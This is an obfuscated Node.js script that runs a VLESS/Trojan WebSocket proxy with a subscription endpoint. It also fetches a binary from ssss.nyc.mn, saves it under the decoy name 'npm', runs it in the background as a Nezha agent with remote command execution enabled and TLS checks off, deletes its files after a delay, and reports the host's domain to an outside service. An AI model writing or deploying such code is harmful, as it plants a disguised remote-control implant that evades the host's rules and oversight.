const _0x2871=['npm\x20running\x20error:','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','message','application/dns-json','stream','http','npm','Answer','Not\x20Found\x0a','text/plain','isp','end','arm','map','then','every','&type=A','https://arm64.ssss.nyc.mn/agent','length','false','concat','&fp=chrome&type=ws&host=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','env','connect','net','unlink','type','connection','error:\x20','createWriteStream','npm\x20is\x20running','crypto','write','&path=%2F','readUInt16BE','url','country_code','digest','decode','includes','Hello\x20world!','pop','update','reduce','catch','writeHead','https://api.ip.sb/geoip','WSPATH','config.yaml','DOMAIN','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-s\x20','buffer','from','pipe','once','writeFileSync','readUInt8','base64','join','send','aarch64','SUB_PATH','listen','8443','slice','finish','log','/bin/bash','index.html','data','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','8.8.4.4','get','application/json','replace','error'];const _0x283e=function(_0x28718f,_0x283ed9){_0x28718f=_0x28718f-0x0;let _0x1fbd8c=_0x2871[_0x28718f];return _0x1fbd8c;};const os=require('os');const http=require(_0x283e('0x5'));const fs=require('fs');const axios=require('axios');const net=require(_0x283e('0x19'));const path=require('path');const crypto=require(_0x283e('0x20'));const {Buffer}=require(_0x283e('0x35'));const {exec,execSync}=require('child_process');const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env']['UUID']||'1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed';const NEZHA_SERVER=process['env']['NEZHA_SERVER']||'';const NEZHA_PORT=process['env']['NEZHA_PORT']||'';const NEZHA_KEY=process['env'][_0x283e('0x33')]||'';const DOMAIN=process['env'][_0x283e('0x32')]||'';const AUTO_ACCESS=process[_0x283e('0x17')]['AUTO_ACCESS']||!![];const WSPATH=process[_0x283e('0x17')][_0x283e('0x30')]||UUID[_0x283e('0x42')](0x0,0x8);const SUB_PATH=process['env'][_0x283e('0x3f')]||'sub';const NAME=process[_0x283e('0x17')]['NAME']||'';const PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x24d255=await axios['get'](_0x283e('0x2f'));const _0x351afe=_0x24d255['data'];ISP=(_0x351afe[_0x283e('0x25')]+'-'+_0x351afe[_0x283e('0xa')])[_0x283e('0x4c')](/ /g,'_');}catch(_0x645750){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x5b20e8,_0x250755)=>{if(_0x5b20e8['url']==='/'){const _0x34a7e5=path[_0x283e('0x3c')](__dirname,_0x283e('0x46'));fs['readFile'](_0x34a7e5,'utf8',(_0x49e3cf,_0x305b14)=>{if(_0x49e3cf){_0x250755['writeHead'](0xc8,{'Content-Type':'text/html'});_0x250755[_0x283e('0xb')](_0x283e('0x29'));return;}_0x250755[_0x283e('0x2e')](0xc8,{'Content-Type':'text/html'});_0x250755[_0x283e('0xb')](_0x305b14);});return;}else if(_0x5b20e8[_0x283e('0x24')]==='/'+SUB_PATH){const _0x4fa495=NAME?NAME+'-'+ISP:ISP;const _0x54df45='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x283e('0x15')+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4fa495;const _0x6f7ce3='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x283e('0x15')+DOMAIN+_0x283e('0x22')+WSPATH+'#'+_0x4fa495;const _0x4d0710=_0x54df45+'\x0a'+_0x6f7ce3;const _0x39bcd5=Buffer[_0x283e('0x36')](_0x4d0710)['toString'](_0x283e('0x3b'));_0x250755['writeHead'](0xc8,{'Content-Type':_0x283e('0x9')});_0x250755[_0x283e('0xb')](_0x39bcd5+'\x0a');}else{_0x250755['writeHead'](0x194,{'Content-Type':_0x283e('0x9')});_0x250755[_0x283e('0xb')](_0x283e('0x8'));}});const wss=new WebSocket['Server']({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=[_0x283e('0x49'),'1.1.1.1'];function resolveHost(_0x492743){return new Promise((_0x528149,_0x3c80fa)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x492743)){_0x528149(_0x492743);return;}let _0x2c924e=0x0;function _0x2c04b3(){if(_0x2c924e>=DNS_SERVERS[_0x283e('0x12')]){_0x3c80fa(new Error('Failed\x20to\x20resolve\x20'+_0x492743+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x16aa6c=DNS_SERVERS[_0x2c924e];_0x2c924e++;const _0x5ae22e='https://dns.google/resolve?name='+encodeURIComponent(_0x492743)+_0x283e('0x10');axios[_0x283e('0x4a')](_0x5ae22e,{'timeout':0x1388,'headers':{'Accept':_0x283e('0x3')}})[_0x283e('0xe')](_0x48402c=>{const _0x51d170=_0x48402c['data'];if(_0x51d170['Status']===0x0&&_0x51d170['Answer']&&_0x51d170['Answer']['length']>0x0){const _0x59f1aa=_0x51d170[_0x283e('0x7')]['find'](_0xf624da=>_0xf624da[_0x283e('0x1b')]===0x1);if(_0x59f1aa){_0x528149(_0x59f1aa['data']);return;}}_0x2c04b3();})['catch'](_0x5c98d8=>{_0x2c04b3();});}_0x2c04b3();});}function handleVlessConnection(_0x34571f,_0x4a9445){const [_0x4ef396]=_0x4a9445;const _0x2bab7d=_0x4a9445['slice'](0x1,0x11);if(!_0x2bab7d[_0x283e('0xf')]((_0x310f73,_0x598482)=>_0x310f73==parseInt(uuid['substr'](_0x598482*0x2,0x2),0x10)))return![];let _0x49bbaf=_0x4a9445['slice'](0x11,0x12)[_0x283e('0x3a')]()+0x13;const _0xe72e6e=_0x4a9445[_0x283e('0x42')](_0x49bbaf,_0x49bbaf+=0x2)['readUInt16BE'](0x0);const _0x43fd39=_0x4a9445['slice'](_0x49bbaf,_0x49bbaf+=0x1)[_0x283e('0x3a')]();const _0x5a386e=_0x43fd39==0x1?_0x4a9445['slice'](_0x49bbaf,_0x49bbaf+=0x4)['join']('.'):_0x43fd39==0x2?new TextDecoder()[_0x283e('0x27')](_0x4a9445[_0x283e('0x42')](_0x49bbaf+0x1,_0x49bbaf+=0x1+_0x4a9445['slice'](_0x49bbaf,_0x49bbaf+0x1)[_0x283e('0x3a')]())):_0x43fd39==0x3?_0x4a9445['slice'](_0x49bbaf,_0x49bbaf+=0x10)['reduce']((_0x4b7b68,_0x4afa5d,_0x3ea331,_0x34a7d5)=>_0x3ea331%0x2?_0x4b7b68[_0x283e('0x14')](_0x34a7d5['slice'](_0x3ea331-0x1,_0x3ea331+0x1)):_0x4b7b68,[])[_0x283e('0xd')](_0x4d60d8=>_0x4d60d8[_0x283e('0x23')](0x0)['toString'](0x10))['join'](':'):'';_0x34571f[_0x283e('0x3d')](new Uint8Array([_0x4ef396,0x0]));const _0x5577e3=createWebSocketStream(_0x34571f);resolveHost(_0x5a386e)[_0x283e('0xe')](_0x53eb25=>{net[_0x283e('0x18')]({'host':_0x53eb25,'port':_0xe72e6e},function(){this[_0x283e('0x21')](_0x4a9445[_0x283e('0x42')](_0x49bbaf));_0x5577e3['on']('error',()=>{})[_0x283e('0x37')](this)['on']('error',()=>{})['pipe'](_0x5577e3);})['on'](_0x283e('0x4d'),()=>{});})['catch'](_0x5d9ffb=>{net[_0x283e('0x18')]({'host':_0x5a386e,'port':_0xe72e6e},function(){this['write'](_0x4a9445['slice'](_0x49bbaf));_0x5577e3['on'](_0x283e('0x4d'),()=>{})['pipe'](this)['on']('error',()=>{})[_0x283e('0x37')](_0x5577e3);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0x25a41d,_0x56f2d2){try{if(_0x56f2d2['length']<0x3a)return![];const _0x2f077d=_0x56f2d2['slice'](0x0,0x38)['toString']();const _0x59df1f=[UUID];let _0x53a974=null;for(const _0x4c9413 of _0x59df1f){const _0x39a15d=crypto['createHash']('sha224')[_0x283e('0x2b')](_0x4c9413)[_0x283e('0x26')]('hex');if(_0x39a15d===_0x2f077d){_0x53a974=_0x4c9413;break;}}if(!_0x53a974)return![];let _0x4c7572=0x38;if(_0x56f2d2[_0x4c7572]===0xd&&_0x56f2d2[_0x4c7572+0x1]===0xa){_0x4c7572+=0x2;}const _0x2a034f=_0x56f2d2[_0x4c7572];if(_0x2a034f!==0x1)return![];_0x4c7572+=0x1;const _0x19e9aa=_0x56f2d2[_0x4c7572];_0x4c7572+=0x1;let _0xe21add,_0x233ab3;if(_0x19e9aa===0x1){_0xe21add=_0x56f2d2['slice'](_0x4c7572,_0x4c7572+0x4)[_0x283e('0x3c')]('.');_0x4c7572+=0x4;}else if(_0x19e9aa===0x3){const _0x1ed48f=_0x56f2d2[_0x4c7572];_0x4c7572+=0x1;_0xe21add=_0x56f2d2['slice'](_0x4c7572,_0x4c7572+_0x1ed48f)['toString']();_0x4c7572+=_0x1ed48f;}else if(_0x19e9aa===0x4){_0xe21add=_0x56f2d2['slice'](_0x4c7572,_0x4c7572+0x10)[_0x283e('0x2c')]((_0x5427c5,_0x3bdcc4,_0x52713a,_0x2845f5)=>_0x52713a%0x2?_0x5427c5[_0x283e('0x14')](_0x2845f5[_0x283e('0x42')](_0x52713a-0x1,_0x52713a+0x1)):_0x5427c5,[])[_0x283e('0xd')](_0x2b54de=>_0x2b54de[_0x283e('0x23')](0x0)['toString'](0x10))['join'](':');_0x4c7572+=0x10;}else{return![];}_0x233ab3=_0x56f2d2[_0x283e('0x23')](_0x4c7572);_0x4c7572+=0x2;if(_0x4c7572<_0x56f2d2['length']&&_0x56f2d2[_0x4c7572]===0xd&&_0x56f2d2[_0x4c7572+0x1]===0xa){_0x4c7572+=0x2;}const _0x2524f4=createWebSocketStream(_0x25a41d);resolveHost(_0xe21add)[_0x283e('0xe')](_0x5cd732=>{net['connect']({'host':_0x5cd732,'port':_0x233ab3},function(){if(_0x4c7572<_0x56f2d2['length']){this['write'](_0x56f2d2['slice'](_0x4c7572));}_0x2524f4['on']('error',()=>{})[_0x283e('0x37')](this)['on']('error',()=>{})[_0x283e('0x37')](_0x2524f4);})['on'](_0x283e('0x4d'),()=>{});})[_0x283e('0x2d')](_0x1932d6=>{net[_0x283e('0x18')]({'host':_0xe21add,'port':_0x233ab3},function(){if(_0x4c7572<_0x56f2d2[_0x283e('0x12')]){this[_0x283e('0x21')](_0x56f2d2[_0x283e('0x42')](_0x4c7572));}_0x2524f4['on'](_0x283e('0x4d'),()=>{})['pipe'](this)['on'](_0x283e('0x4d'),()=>{})['pipe'](_0x2524f4);})['on'](_0x283e('0x4d'),()=>{});});return!![];}catch(_0x5a0822){return![];}}wss['on'](_0x283e('0x1c'),(_0x3f6109,_0x5236f9)=>{const _0x5bf3a2=_0x5236f9['url']||'';_0x3f6109[_0x283e('0x38')](_0x283e('0x2'),_0x24593d=>{if(_0x24593d['length']>0x11&&_0x24593d[0x0]===0x0){const _0x5e26a4=_0x24593d[_0x283e('0x42')](0x1,0x11);const _0x12eb93=_0x5e26a4['every']((_0x7faf45,_0x4854ca)=>_0x7faf45==parseInt(uuid['substr'](_0x4854ca*0x2,0x2),0x10));if(_0x12eb93){if(!handleVlessConnection(_0x3f6109,_0x24593d)){_0x3f6109['close']();}return;}}if(!handleTrojanConnection(_0x3f6109,_0x24593d)){_0x3f6109['close']();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x55d22e=os['arch']();if(_0x55d22e===_0x283e('0xc')||_0x55d22e==='arm64'||_0x55d22e===_0x283e('0x3e')){if(!NEZHA_PORT){return'https://arm64.ssss.nyc.mn/v1';}else{return _0x283e('0x11');}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x473ebe=getDownloadUrl();const _0x1bac42=await axios({'method':'get','url':_0x473ebe,'responseType':_0x283e('0x4')});const _0xa5898a=fs[_0x283e('0x1e')](_0x283e('0x6'));_0x1bac42[_0x283e('0x47')]['pipe'](_0xa5898a);return new Promise((_0x20ebcd,_0x4a796b)=>{_0xa5898a['on'](_0x283e('0x43'),()=>{console['log']('npm\x20download\x20successfully');exec('chmod\x20+x\x20npm',_0x5e6026=>{if(_0x5e6026)_0x4a796b(_0x5e6026);_0x20ebcd();});});_0xa5898a['on'](_0x283e('0x4d'),_0x4a796b);});}catch(_0x826f9a){throw _0x826f9a;}};const runnz=async()=>{try{const _0x67822=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x67822['trim']()!==''){console[_0x283e('0x44')]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3867ea){}await downloadFile();let _0x3e846a='';let _0x12b2af=['443',_0x283e('0x41'),'2096','2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x30dd59=_0x12b2af[_0x283e('0x28')](NEZHA_PORT)?'--tls':'';_0x3e846a=_0x283e('0x34')+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x30dd59+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ffc41=NEZHA_SERVER[_0x283e('0x28')](':')?NEZHA_SERVER['split'](':')[_0x283e('0x2a')]():'';const _0x592392=_0x12b2af[_0x283e('0x28')](_0x3ffc41)?'true':_0x283e('0x13');const _0x46be05='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x592392+_0x283e('0x16')+UUID;fs[_0x283e('0x39')](_0x283e('0x31'),_0x46be05);}_0x3e846a=_0x283e('0x48');}else{console['log'](_0x283e('0x1'));return;}try{exec(_0x3e846a,{'shell':_0x283e('0x45')},_0xe795dc=>{if(_0xe795dc)console[_0x283e('0x4d')](_0x283e('0x0'),_0xe795dc);else console[_0x283e('0x44')](_0x283e('0x1f'));});}catch(_0x32aed3){console[_0x283e('0x4d')](_0x283e('0x1d')+_0x32aed3);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x41d3a1='https://'+DOMAIN;try{const _0x271934=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x41d3a1},{'headers':{'Content-Type':_0x283e('0x4b')}});console[_0x283e('0x44')]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x41cf16){}}const delFiles=()=>{fs[_0x283e('0x1a')](_0x283e('0x6'),()=>{});fs[_0x283e('0x1a')](_0x283e('0x31'),()=>{});};httpServer[_0x283e('0x40')](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
